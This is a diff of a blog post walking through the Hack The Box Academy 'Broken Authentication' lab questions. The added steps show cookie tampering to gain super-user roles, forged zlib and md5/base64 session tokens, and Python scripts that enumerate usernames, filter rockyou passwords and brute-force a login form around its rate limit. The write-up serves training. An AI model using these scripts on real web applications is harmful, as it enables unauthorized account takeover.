@@ -17,8 +17,17 @@ layout: single
 toc: true
 ---
 ![image-center](\assets\images\HTB_broken_authentication\upper.jpg)
+
+
+
+## Disclaimer
+<img style="float: left; padding-right:10px" src="\assets\images\disclaimer.png" width="110" height="110">
+
+<div style="text-align: justify">The following post may contain spoilers. Use it as a guide or support. It is always better to try it by yourself!</div>
+<div style="text-align: justify">Enjoy :)</div><br>
+
 ## Module Summary
-This module covers common vulnerabilities and misconfigurations regarding Authentication that could be leveraged to gain unauthorized access to a web application. Specifically, in this module, we will cover:
+<div style="text-align: justify">This module covers common vulnerabilities and misconfigurations regarding Authentication that could be leveraged to gain unauthorized access to a web application. Specifically, in this module, we will cover:</div><br>
 
   - An overview of authentication methods
   - Common protection mechanisms and possible bypasses
@@ -224,7 +233,7 @@ if __name__ == "__main__":
 ## Brute Forcing Passwords
 
 >**Q. Using rockyou-50.txt as password wordlist and htbuser as the username, find the policy and filter out strings that don't respect it. What is the valid password for the htbuser account?**
-<div style="text-align: justify">1. For this question we are entering different random passwords to check the password complexity filter. We see that a password with numbers and capital letters is requested. We use the following grep with rockyou-50.txt to get a list that we will use in the Intruder.</div><br>
+<div style="text-align: justify">1. For this question we are entering different random passwords to check the password complexity filter. We see that a password with numbers and capital letters is requested. We use the following grep with rockyou-50.txt to get a list that we will use in the Intruder.</div>
 
 ```bash
 grep '[[:upper:]]' /home/marcos/htb-academy/broken_authentication/SecLists-master/Passwords/Leaked-Databases/rockyou-50.txt | grep -E '[0-9]{1,4}'
@@ -250,8 +259,7 @@ grep '[[:upper:]]' /home/marcos/htb-academy/broken_authentication/SecLists-maste
 
 >**Q. Create a token on the web application exposed at subdirectory /question1/ using the *Create a reset token for htbuser* button. Within an interval of +-1 second a token for the htbadmin user will also be created. The algorithm used to generate both tokens is the same as the one shown when talking about the Apache OpenMeeting bug. Forge a valid token for htbadmin and login by pressing the "Check" button. What is the flag?**
 
-<div style="text-align: justify">1. To solve this question we need to modify the reset_token_time.py script to generate tokens within +/- two seconds of the time shown in the target. For this we access the following web page</div><br>
-[EpochConverter](https://www.epochconverter.com/)
+<div style="text-align: justify">1. To solve this question we need to modify the reset_token_time.py script to generate tokens within +/- two seconds of the time shown in the target. For this we access the following webpage:</div> [EpochConverter](https://www.epochconverter.com/)
 
 <div style="text-align: justify">2. We introduce the time that the target "And has been created at" shows us and we generate the "Epoch timestamp in milliseconds". We do this process with +/-2 seconds and fill in the "now", "start_time" and "end_time" variables in the script.</div>
 
@@ -336,7 +344,7 @@ python3 user.py
 <div style="text-align: justify">2. We enter random answers in "Reset your password" until we find the question "What is your favorite color?"</div><br>
 ![image-center](\assets\images\HTB_broken_authentication\Q6\2.png)
 
-<div style="text-align: justify">3. We modify the following python script to point to our target url and to the correct question from the previous step.</div><br>
+<div style="text-align: justify">3. We modify the following python script to point to our target url and to the correct question from the previous step.</div>
 
 ```python
 import sys
@@ -397,7 +405,7 @@ def main():
             answer = unpack(fline.rstrip())
 
             # do HTTP request
-            print("[-] Checking word {}".format(answer))
+            print("[-] Checking word {}".format(answer))<!-- 
             res = do_req(url, answer, headers)
 
             # check if response text matches our content
@@ -407,11 +415,10 @@ def main():
                 sys.exit()
 
 if __name__ == "__main__":
-    main()
+    main() -->
 ```
 
-<div style="text-align: justify">4. We execute the script with the list "htm-colors.txt" that we can find in:</div><br>
-[SecLists](https://github.com/danielmiessler/SecLists)
+<div style="text-align: justify">4. We execute the script with the list "htm-colors.txt" that we can find in:</div> [SecLists](https://github.com/danielmiessler/SecLists)
 
 ```sh
 python3 reset_password.py /home/marcos/htb-academy/broken_authentication/SecLists-master/Miscellaneous/security-question-answers/html-colors.txt
@@ -449,8 +456,276 @@ python3 reset_password.py /home/marcos/htb-academy/broken_authentication/SecList
 
 >**Q. Tamper the session cookie for the application at subdirectory /question1/ to give yourself access as a super user. What is the flag?**
 
+<div style="text-align: justify">1. We access the target and see that the user role is "student". We go to developer tools/storage to capture the cookie.</div><br>
+![image-center](\assets\images\HTB_broken_authentication\Q8\1.png)
+
+<div style="text-align: justify">2. Paste the cookie in Burpsuite Decoder and change the "=" symbol to "%3D".</div><br>
+![image-center](\assets\images\HTB_broken_authentication\Q8\2.png)
+
+<div style="text-align: justify">3. We decode the cookie as Base64 and then ASCII Hex and see the cookie in plain text.</div><br>
+![image-center](\assets\images\HTB_broken_authentication\Q8\3.png)
+
+<div style="text-align: justify">4. We change the role to "super" and encode first as ASCII Hex and then as Base64.</div><br>
+![image-center](\assets\images\HTB_broken_authentication\Q8\4.png)
+
+<div style="text-align: justify">5. We copy the cookie and paste it in the session started previously. We refresh the web page and get the flag.</div><br>
+![image-center](\assets\images\HTB_broken_authentication\Q8\5.png)
+
 >**Q. Log in to the target application and tamper the rememberme token to give yourself super user privileges. After escalating privileges, submit the flag as your answer.**
+
+<div style="text-align: justify">1. Enter the provided credentials and click on the "Remember me" box.</div><br>
+![image-center](\assets\images\HTB_broken_authentication\Q8\6.png)
+
+<div style="text-align: justify">2. We see that there is a persistent cookie.</div><br>
+![image-center](\assets\images\HTB_broken_authentication\Q8\7.png)
+
+<div style="text-align: justify">3. We use the website:</div> [CyberChef](https://gchq.github.io/)
+<div style="text-align: justify">Decode the cookie first at Base64 and then at Hex and see what the first two characters are.</div><br>
+![image-center](\assets\images\HTB_broken_authentication\Q8\8.png)
+
+<div style="text-align: justify">4. We look for those two characters in following wikipage and verify that it is "zlib" extension:</div> [List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) 
+
+![image-center](\assets\images\HTB_broken_authentication\Q8\9.png)
+
+<div style="text-align: justify">5. We decode the cookie first from Base64, clicking on "Remove non-aphabet chars" and then on Zlib inflat as shown in the image. We see the cookie in plain text with the user "htbuser" and the role "student".</div><br>
+![image-center](\assets\images\HTB_broken_authentication\Q8\10.png)
+
+<div style="text-align: justify">6. We perform the reverse process to the previous step with user "htbadmin" and role "super" to obtain the cookie.</div><br>
+![image-center](\assets\images\HTB_broken_authentication\Q8\11.png)
+
+<div style="text-align: justify">7. We introduce the cookie in the persistent cookie value and update getting the flag.</div><br>
+![image-center](\assets\images\HTB_broken_authentication\Q8\12.png)
+
 
 ## Skill Assessment - Broken Authentication
 
 >**Q. Assess the web application and use various techniques to escalate to a privileged user and find a flag in the admin panel. Submit the contents of the flag as your answer.**
+
+<div style="text-align: justify">1. We access the target and see that it is a login.</div><br>
+![image-center](\assets\images\HTB_broken_authentication\Q9\1.png)
+
+<div style="text-align: justify">2. Click on create account.</div><br>
+![image-center](\assets\images\HTB_broken_authentication\Q9\2.png)
+
+<div style="text-align: justify">3. We fill in the fields.</div><br>
+![image-center](\assets\images\HTB_broken_authentication\Q9\3.png)
+
+<div style="text-align: justify">4. We see that the password needs a series of requirements.</div><br>
+![image-center](\assets\images\HTB_broken_authentication\Q9\4.png)
+![image-center](\assets\images\HTB_broken_authentication\Q9\5.png)
+![image-center](\assets\images\HTB_broken_authentication\Q9\6.png)
+![image-center](\assets\images\HTB_broken_authentication\Q9\7.png)
+
+<div style="text-align: justify">5. Once we meet the password requirements, we get our account and can log in.</div><br>
+![image-center](\assets\images\HTB_broken_authentication\Q9\8.png)
+![image-center](\assets\images\HTB_broken_authentication\Q9\9.png)
+
+<div style="text-align: justify">6. Access the support page and see an important clue related to the support account and other support accounts with country codes.</div><br>
+![image-center](\assets\images\HTB_broken_authentication\Q9\10.png)
+
+<div style="text-align: justify">7. On the messages page we see if we can send a message to other users. We check that if the user does not exist an error is displayed, however if the user exists the message is sent.</div><br>
+![image-center](\assets\images\HTB_broken_authentication\Q9\12.png)
+![image-center](\assets\images\HTB_broken_authentication\Q9\11.png)
+
+<div style="text-align: justify">8. I created a python script to concatenate suffixes and prefixes in different ways so that we can bruteforce "messages.php".</div>
+
+```python
+import itertools
+import numpy
+
+# user we want concatenate
+user = 'support'
+ 
+# Append suffix / prefix to user
+arch = open('/home/marcos/htb-academy/broken_authentication/SecLists-master/Fuz>
+
+for linea in arch:
+    pre_user = [user + linea.rstrip()]
+    print (''.join(pre_user))
+    sub_user = [linea.rstrip() + user]
+    print (''.join(sub_user))
+    dot_user = [user + '.' + linea.rstrip()]
+    print (''.join(dot_user))
+
+
+arch.close()
+```
+
+<div style="text-align: justify">9. We run the script as follows:</div>
+
+```sh
+python3 concatenate.py > list.txt
+```
+
+<div style="text-align: justify">10. And get a list with the user "support" and different prefixes and suffixes with the country code.</div><br>
+![image-center](\assets\images\HTB_broken_authentication\Q9\13.png)
+
+<div style="text-align: justify">11. I create a script in python that with the previous list, the cookie of our logged in user and pointing to messages.php, will return a list of valid users.</div>
+
+```python
+import requests
+import time
+
+# file that contain user:pass
+user_file = "list.txt"
+
+# create url using user and password as argument
+url = "http://178.128.171.82:31442/messages.php"
+cookies = {'htb_sessid': 'YTAzMTRmNWU1Mjg5ZWYzYjNlZTY5Y2U1NmFjNGZkOWM%3D'}
+
+# read user file 
+with open(user_file, "r") as fh:
+    for fline in fh:
+        # skip comment
+        if fline.startswith("#"):
+            continue
+
+        username = fline.rstrip()
+        message = "a"
+        submit = "submit"
+
+        # prepare POST data
+        data = {
+            "user": username,
+            "message": message,
+            "submit": submit
+        }
+        
+        # do the request
+        res = requests.post(url, data=data, cookies=cookies)
+
+        # print only valid usernames
+        if "Message sent" in res.text:
+            print("[+] Valid username: user:{}".format(username))
+ ```
+
+<div style="text-align: justify">12. See the list of valid users after executing the following command.</div>
+
+```sh
+python3 brute_force_messages.py
+```
+![image-center](\assets\images\HTB_broken_authentication\Q9\14.png)
+
+<div style="text-align: justify">13. I create a bash script to filter the passwords according to the requirements that we have discovered when creating our account.</div>
+
+```sh
+#!/bin/bash
+grep -E '^[A-Z]' /usr/share/wordlists/rockyou.txt | grep '[0-9]$' | grep '[^A-Za-z0-9]' | awk 'length >= 20 && length <= 29'
+```
+<div style="text-align: justify">14. Run the script and save the passwords in "pass.txt".</div>
+
+```sh
+./password_filter.sh > pass.txt
+```
+![image-center](\assets\images\HTB_broken_authentication\Q9\15.png)
+
+<div style="text-align: justify">15. Now we modify the rate_limit_check.py script to bruteforce the login with the previously discovered users and the passwords leaked in the previous step. In this case we will use "support.us".</div>
+
+```python
+import requests
+import time
+
+# file that contain user:pass
+pass_file = "pass.txt"
+
+# create url using user and password as argument
+url = "http://178.128.171.82:31442/login.php"
+
+# rate limit blocks for 30 seconds
+lock_time = 31
+
+# message that alert us we hit rate limit
+lock_message = "Too many login failures"
+
+# read and password
+with open(pass_file, "r") as fh:
+    for fline in fh:
+        # skip comment
+        if fline.startswith("#"):
+            continue
+
+        username = "support.us"
+        password = fline.rstrip()
+        submit = "submit"
+
+        # prepare POST data
+        data = {
+            "userid": username,
+            "passwd": password,
+            "submit": submit
+        }
+        
+        # do the request
+        res = requests.post(url, data=data)
+        
+        # handle generic credential error
+        if "Invalid credentials" in res.text:
+            print("[-] Invalid credentials: userid:{} passwd:{}".format(username, password))
+        # hit rate limit, let's say we have to wait 30 seconds
+        elif lock_message in res.text:
+            print("[-] Hit rate limit, sleeping 30")
+            # do the actual sleep plus 0.5 to be sure
+            time.sleep(lock_time+0.5)
+        else:
+            print("[+] Valid credentials: userid:{} passwd:{}".format(username, password))
+```
+
+<div style="text-align: justify">16. Run the script and find a password for "support.us" (this step can be done for any support user).</div>
+
+```sh
+python3 rate_limit_check_FA.py
+```
+
+![image-center](\assets\images\HTB_broken_authentication\Q9\16.png)
+
+<div style="text-align: justify">17. Log in with the user support.us and the password found in the previous step.</div><br>
+![image-center](\assets\images\HTB_broken_authentication\Q9\17.png)
+
+<div style="text-align: justify">18. Now we open the developer tools in the browser and click on the storage tab. Let's analyze the cookie.</div><br>
+![image-center](\assets\images\HTB_broken_authentication\Q9\18.png)
+
+<div style="text-align: justify">19. Download and install the Decode tool, and with it we decode the cookie.</div> [Decodify](https://github.com/s0md3v/Decodify)
+
+```sh
+python3 dcode "cookie"
+```
+
+![image-center](\assets\images\HTB_broken_authentication\Q9\19.png)
+
+<div style="text-align: justify">20. In the decoded cookie we see how there is ":" between two strings. We proceed to decode each side.</div>
+<div style="text-align: justify">md5->base64->urlencode</div><br>
+![image-center](\assets\images\HTB_broken_authentication\Q9\20.png)
+
+<div style="text-align: justify">21. Proceed to search if there are administrator users. To do this, we go to the messages tab and proceed in the same way as with the support user, that is, adding a country code suffix. In this case "admin.us". (For this step we can reuse the previous scripts if necessary). See that the user exists so we proceed to build a cookie similar to "support.us". Use the fields "admin.us:admin", encode the string at md5, then at base64 and finally at URLENCODE.</div><br>
+![image-center](\assets\images\HTB_broken_authentication\Q9\21.png)
+
+<div style="text-align: justify">22. I create a script that, when we pass the user and the role as parameters, performs the previous process and returns the string encoded at Base64.</div>
+
+```sh
+#!/bin/bash
+
+word1=$1
+word2=$2
+
+word1_md5=$(echo -n "${word1}" | md5sum | cut -d ' ' -f 1)
+word2_md5=$(echo -n "${word2}" | md5sum | cut -d ' ' -f 1)
+word=$(echo -n "$word1_md5:$word2_md5")
+word_base64=$(echo -n "${word}" | base64)
+
+echo "$word_base64"
+```
+
+<div style="text-align: justify">23. Run the script and get the string at base64.</div>
+
+```sh
+./encrypt_md5_base64.sh admin.us adm
+```
+![image-center](\assets\images\HTB_broken_authentication\Q9\22.png)
+
+<div style="text-align: justify">23. In CyberChef we introduce the previous string and encode it with URLENCODE, checking the box "Encode all special chars".</div>
+[CyberChef](https://gchq.github.io/)<br>
+
+![image-center](\assets\images\HTB_broken_authentication\Q9\23.png)
+
+<div style="text-align: justify">24. We copy the generated string and go to the browser. In developer tools/storage/cookies, we change the value of the "htb_sessid" cookie to the one generated in the previous step. We refresh the page and get the flag.</div><br>
+![image-center](\assets\images\HTB_broken_authentication\Q9\24.png)
